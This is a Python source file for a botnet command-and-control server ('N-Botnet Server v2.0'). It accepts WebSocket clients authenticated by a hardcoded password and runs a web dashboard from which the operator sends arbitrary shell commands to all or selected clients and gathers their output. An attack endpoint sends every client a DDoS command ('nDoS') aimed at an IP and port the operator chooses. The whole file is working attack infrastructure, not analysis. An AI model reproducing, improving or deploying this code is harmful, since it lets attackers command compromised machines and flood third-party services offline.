#!/usr/bin/env python3
"""
N-Botnet Server
===============
WebSocket server for client connections + HTTP web dashboard.
Clients authenticate with password, server can broadcast commands.

Usage:
  python3 server.py

Web Dashboard: http://localhost:8080
Client Port:   9000 (WebSocket)
"""

import asyncio
import json
import signal
import threading
import time
import uuid
import os
import socket
from collections import deque
from http.server import HTTPServer, SimpleHTTPRequestHandler
from urllib.parse import urlparse

import websockets

# ===== CONFIG =====
HOST = "0.0.0.0"
WS_PORT = 9000
HTTP_PORT = 8080
PASSWORD = "nhinconmemay"
DASHBOARD_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "dashboard.html")
MAX_HISTORY = 200

# ===== SHARED STATE =====
connected_clients = {}
command_history = deque(maxlen=MAX_HISTORY)
lock = threading.Lock()
shutdown_event = threading.Event()

# ===== ATTACK STATE =====
attack_state = {
    "active": False,
    "target_ip": "",
    "target_port": "",
    "cmd_id": "",
    "command": "",
    "client_count": 0,
    "started_at": ""
}


async def handle_client(websocket):
    """Handle a single WebSocket client connection."""
    client_id = None
    client_ip = websocket.remote_address[0] if websocket.remote_address else "unknown"
    
    try:
        async for message in websocket:
            try:
                data = json.loads(message)
            except json.JSONDecodeError:
                await websocket.send(json.dumps({"type": "error", "message": "Invalid JSON"}))
                continue

            if data.get("type") == "auth":
                if data.get("password") == PASSWORD:
                    client_id = f"client_{uuid.uuid4().hex[:8]}"
                    hostname = data.get("hostname", socket.gethostname())
                    
                    with lock:
                        connected_clients[client_id] = {
                            "ws": websocket,
                            "ip": client_ip,
                            "hostname": hostname,
                            "connected_at": time.strftime("%Y-%m-%d %H:%M:%S")
                        }

                    await websocket.send(json.dumps({
                        "type": "auth_ok",
                        "client_id": client_id
                    }))
                    print(f"[+] Client connected: {client_id} ({client_ip})")
                    break
                else:
                    await websocket.send(json.dumps({
                        "type": "auth_fail",
                        "reason": "Wrong password"
                    }))
                    print(f"[-] Auth failed from {client_ip}")
                    return

            elif data.get("type") == "ping":
                await websocket.send(json.dumps({"type": "pong"}))
        
        if not client_id:
            return

        async for message in websocket:
            try:
                data = json.loads(message)
            except json.JSONDecodeError:
                continue

            if data.get("type") == "result":
                cmd_id = data.get("cmd_id", "")
                output = data.get("output", "")
                with lock:
                    for cmd in command_history:
                        if cmd["cmd_id"] == cmd_id:
                            cmd["responses"][client_id] = {
                                "output": output,
                                "time": time.strftime("%Y-%m-%d %H:%M:%S")
                            }
                            break
                print(f"[→] Result from {client_id}: {output[:100]}...")

            elif data.get("type") == "ping":
                await websocket.send(json.dumps({"type": "pong"}))

    except websockets.exceptions.ConnectionClosed:
        pass
    finally:
        if client_id:
            with lock:
                if client_id in connected_clients:
                    del connected_clients[client_id]
            print(f"[-] Client disconnected: {client_id}")


async def broadcast_command(command, cmd_id, target="all"):
    """Send command to clients. target='all' or specific client_id."""
    sent_count = 0
    with lock:
        targets = list(connected_clients.items())
    
    for cid, info in targets:
        if target == "all" or target == cid:
            try:
                await info["ws"].send(json.dumps({
                    "type": "command",
                    "cmd_id": cmd_id,
                    "command": command
                }))
                sent_count += 1
            except Exception as e:
                print(f"[!] Failed to send to {cid}: {e}")
    
    return sent_count


async def broadcast_execute(command, cmd_id, target_ip, target_port):
    """Send 'execute' message to all clients (background process)."""
    sent_count = 0
    with lock:
        targets = list(connected_clients.items())
    
    for cid, info in targets:
        try:
            await info["ws"].send(json.dumps({
                "type": "execute",
                "cmd_id": cmd_id,
                "command": command,
                "target_ip": target_ip,
                "target_port": target_port
            }))
            sent_count += 1
        except Exception as e:
            print(f"[!] Failed to send execute to {cid}: {e}")
    
    return sent_count


async def broadcast_stop(cmd_id):
    """Send 'stop' message to all clients to kill their running processes."""
    sent_count = 0
    with lock:
        targets = list(connected_clients.items())
    
    for cid, info in targets:
        try:
            await info["ws"].send(json.dumps({
                "type": "stop",
                "cmd_id": cmd_id
            }))
            sent_count += 1
        except Exception as e:
            print(f"[!] Failed to send stop to {cid}: {e}")
    
    return sent_count


async def broadcast_status(cmd_id):
    """Query status from all clients."""
    sent_count = 0
    with lock:
        targets = list(connected_clients.items())
    
    for cid, info in targets:
        try:
            await info["ws"].send(json.dumps({
                "type": "status",
                "cmd_id": cmd_id
            }))
            sent_count += 1
        except Exception as e:
            print(f"[!] Failed to send status to {cid}: {e}")
    
    return sent_count


async def ws_server():
    """Run the WebSocket server."""
    print(f"[*] WebSocket server listening on {HOST}:{WS_PORT}")
    loop = asyncio.get_running_loop()
    stop_future = loop.create_future()
    
    for sig in (signal.SIGINT, signal.SIGTERM):
        try:
            loop.add_signal_handler(
                sig,
                lambda: stop_future.set_result(None)
            )
        except NotImplementedError:
            pass
    
    async with websockets.serve(handle_client, HOST, WS_PORT):
        await stop_future


# ===== HTTP SERVER =====

class DashboardAPIHandler(SimpleHTTPRequestHandler):
    
    def do_GET(self):
        parsed = urlparse(self.path)
        
        if parsed.path == "/":
            self.serve_dashboard()
        elif parsed.path == "/api/clients":
            self.handle_get_clients()
        elif parsed.path == "/api/history":
            self.handle_get_history()
        elif parsed.path == "/api/stats":
            self.handle_get_stats()
        elif parsed.path == "/api/attack/status":
            self.handle_attack_status()
        else:
            self.send_error(404, "Not Found")
    
    def do_POST(self):
        parsed = urlparse(self.path)
        
        if parsed.path == "/api/command":
            self.handle_send_command()
        elif parsed.path == "/api/disconnect":
            self.handle_disconnect_client()
        elif parsed.path == "/api/attack/start":
            self.handle_attack_start()
        elif parsed.path == "/api/attack/stop":
            self.handle_attack_stop()
        else:
            self.send_error(404, "Not Found")
    
    def do_OPTIONS(self):
        self.send_cors_headers()
        self.send_response(200)
        self.end_headers()
    
    def send_cors_headers(self):
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
    
    def serve_dashboard(self):
        try:
            with open(DASHBOARD_FILE, "rb") as f:
                content = f.read()
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Cache-Control", "no-cache")
            self.end_headers()
            self.wfile.write(content)
        except FileNotFoundError:
            self.send_error(500, "Dashboard HTML not found")
    
    def handle_get_clients(self):
        with lock:
            clients = [
                {
                    "id": cid,
                    "ip": info["ip"],
                    "hostname": info["hostname"],
                    "connected_at": info["connected_at"]
                }
                for cid, info in connected_clients.items()
            ]
        self.send_json(clients)
    
    def handle_get_history(self):
        with lock:
            history = list(command_history)[-50:]
            history = [
                {
                    "cmd_id": cmd["cmd_id"],
                    "command": cmd["command"],
                    "target": cmd["target"],
                    "timestamp": cmd["timestamp"],
                    "responses": cmd["responses"]
                }
                for cmd in history
            ]
        self.send_json(history)
    
    def handle_get_stats(self):
        with lock:
            stats = {
                "connected_clients": len(connected_clients),
                "total_commands": len(command_history),
                "server_uptime": time.strftime("%Y-%m-%d %H:%M:%S")
            }
        self.send_json(stats)
    
    def handle_attack_status(self):
        """Return current attack state."""
        with lock:
            status = {
                "active": attack_state["active"],
                "target_ip": attack_state["target_ip"],
                "target_port": attack_state["target_port"],
                "cmd_id": attack_state["cmd_id"],
                "command": attack_state["command"],
                "client_count": attack_state["client_count"],
                "started_at": attack_state["started_at"]
            }
        self.send_json(status)
    
    def handle_send_command(self):
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length)
        
        try:
            data = json.loads(body)
        except json.JSONDecodeError:
            self.send_json({"error": "Invalid JSON"}, 400)
            return
        
        command = data.get("command", "").strip()
        target = data.get("target", "all")
        
        if not command:
            self.send_json({"error": "Command is empty"}, 400)
            return
        
        cmd_id = f"cmd_{uuid.uuid4().hex[:8]}"
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        
        with lock:
            command_history.append({
                "cmd_id": cmd_id,
                "command": command,
                "target": target,
                "timestamp": timestamp,
                "responses": {}
            })
        
        future = asyncio.run_coroutine_threadsafe(
            broadcast_command(command, cmd_id, target),
            ws_loop
        )
        
        try:
            sent_count = future.result(timeout=5)
            self.send_json({
                "success": True,
                "cmd_id": cmd_id,
                "sent_to": sent_count,
                "message": f"Command sent to {sent_count} client(s)"
            })
        except Exception as e:
            self.send_json({"success": False, "error": str(e)}, 500)
    
    def handle_attack_start(self):
        """Start attack — send execute command to all clients with target IP:Port."""
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length)
        
        try:
            data = json.loads(body)
        except json.JSONDecodeError:
            self.send_json({"error": "Invalid JSON"}, 400)
            return
        
        target_ip = data.get("ip", "").strip()
        target_port = data.get("port", "").strip()
        
        if not target_ip or not target_port:
            self.send_json({"error": "IP and Port are required"}, 400)
            return
        
        # Build the command
        command = f"mno nDoS.mno {target_ip}:{target_port} 400"
        
        cmd_id = f"attack_{uuid.uuid4().hex[:8]}"
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        
        # Store in history
        with lock:
            command_history.append({
                "cmd_id": cmd_id,
                "command": command,
                "target": "all",
                "timestamp": timestamp,
                "responses": {}
            })
            attack_state["active"] = True
            attack_state["target_ip"] = target_ip
            attack_state["target_port"] = target_port
            attack_state["cmd_id"] = cmd_id
            attack_state["command"] = command
            attack_state["started_at"] = timestamp
        
        future = asyncio.run_coroutine_threadsafe(
            broadcast_execute(command, cmd_id, target_ip, target_port),
            ws_loop
        )
        
        try:
            sent_count = future.result(timeout=5)
            with lock:
                attack_state["client_count"] = sent_count
            self.send_json({
                "success": True,
                "cmd_id": cmd_id,
                "sent_to": sent_count,
                "message": f"Task sent to {sent_count} client(s) targeting {target_ip}:{target_port}"
            })
        except Exception as e:
            with lock:
                attack_state["active"] = False
            self.send_json({"success": False, "error": str(e)}, 500)
    
    def handle_attack_stop(self):
        """Stop attack — send stop signal to all clients."""
        with lock:
            cmd_id = attack_state["cmd_id"]
        
        future = asyncio.run_coroutine_threadsafe(
            broadcast_stop(cmd_id),
            ws_loop
        )
        
        try:
            sent_count = future.result(timeout=5)
            with lock:
                attack_state["active"] = False
            self.send_json({
                "success": True,
                "sent_to": sent_count,
                "message": f"Stop signal sent to {sent_count} client(s)"
            })
        except Exception as e:
            self.send_json({"success": False, "error": str(e)}, 500)
    
    def handle_disconnect_client(self):
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length)
        
        try:
            data = json.loads(body)
        except json.JSONDecodeError:
            self.send_json({"error": "Invalid JSON"}, 400)
            return
        
        client_id = data.get("client_id", "")
        
        with lock:
            if client_id in connected_clients:
                info = connected_clients[client_id]
                del connected_clients[client_id]
                asyncio.run_coroutine_threadsafe(
                    info["ws"].close(),
                    ws_loop
                )
                self.send_json({"success": True, "message": f"Disconnected {client_id}"})
            else:
                self.send_json({"error": "Client not found"}, 404)
    
    def send_json(self, data, status=200):
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Cache-Control", "no-cache")
        self.send_cors_headers()
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())
    
    def log_message(self, format, *args):
        pass


def run_http_server():
    server = HTTPServer((HOST, HTTP_PORT), DashboardAPIHandler)
    server.timeout = 1
    print(f"[*] HTTP Dashboard: http://{HOST}:{HTTP_PORT}")
    print(f"    Or:           http://localhost:{HTTP_PORT}")
    while not shutdown_event.is_set():
        server.handle_request()


# ===== MAIN =====

def main():
    global ws_loop
    
    print("=" * 60)
    print("  N-Botnet Server v2.0")
    print("  Remote Device Management System")
    print("=" * 60)
    print(f"  Client WebSocket : {HOST}:{WS_PORT}")
    print(f"  Web Dashboard    : http://localhost:{HTTP_PORT}")
    print(f"  Password         : {PASSWORD}")
    print("=" * 60)
    
    ws_loop = asyncio.new_event_loop()
    asyncio.set_event_loop(ws_loop)
    
    http_thread = threading.Thread(target=run_http_server, daemon=True)
    http_thread.start()
    
    try:
        ws_loop.run_until_complete(ws_server())
    except (KeyboardInterrupt, SystemExit):
        pass
    finally:
        print("\n[*] Shutting down...")
        shutdown_event.set()
        ws_loop.stop()
        ws_loop.close()
        print("[✓] Server stopped.")


if __name__ == "__main__":
    main()
